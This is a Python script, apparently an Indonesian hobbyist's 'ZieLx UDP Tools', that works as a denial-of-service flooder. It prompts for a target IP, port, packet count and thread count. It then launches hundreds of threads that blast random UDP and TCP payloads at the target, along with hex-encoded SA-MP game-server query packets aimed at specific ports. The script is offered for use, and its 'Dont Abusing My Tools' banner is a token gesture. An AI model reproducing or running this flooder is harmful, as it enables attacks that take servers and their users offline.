#HAI KONTOL NGAPAIN MAU RENAME?
#SUBS YT GW KOBTOL
#ZIEL ?
import random
import threading
import codecs
import struct
import time
import socket
import sys
import os

os.system("clear")
password ="byzielx"

for i in range(3):
	pwd = input("[•] Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] Correct Password Wait 5 Second!!!")
		break
	else:
		time.sleep(5)
		print("\033[91m[×] Wrong Password!!! ")
		continue
time.sleep(5)
print("[•] Login Succesfull \033[92m√")
os.system("clear")

print("""
\033[94m
 
 ███████╗██╗███████╗██╗░░░░░██╗░░██╗ ╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝ ░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░ ██╔══╝░░██║██╔══╝░░██║░░░░░░██╔██╗░ ███████╗██║███████╗███████╗██╔╝╚██╗ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
         ++   ZieLx UDP Tools   ++
      ++    Dont Abusing My Tools   ++
""")

ip = str(input("\033[95m=====> + IP Target    : "))
port = int(input("=====> + PORT Target  : "))
times = int(input("=====> $ Send PACKETS : "))
threads = int(input("=====> $ Send THREADS : "))
choice = str(input("=====> × Ready? (y/n) : "))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(1460)
	i = random.choice(("[•]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[96m ZieLx Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
		except:
			print("\033[96m[•] ZieLx Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")

def run2():
	data = random._urandom(1030)
	i = random.choice(("[•]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))

		except:
			s.close()
			print("\u001b[31m[•] ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
            

def run3():
	data = random._urandom(999)
	i = random.choice(("[•]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[•] ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
            
  
def run4():
	data = random._urandom(818)
	i = random.choice(("[+]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[•] ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
			
def run5():
	data = random._urandom(17)
	i = random.choice(("[+]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[•] ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()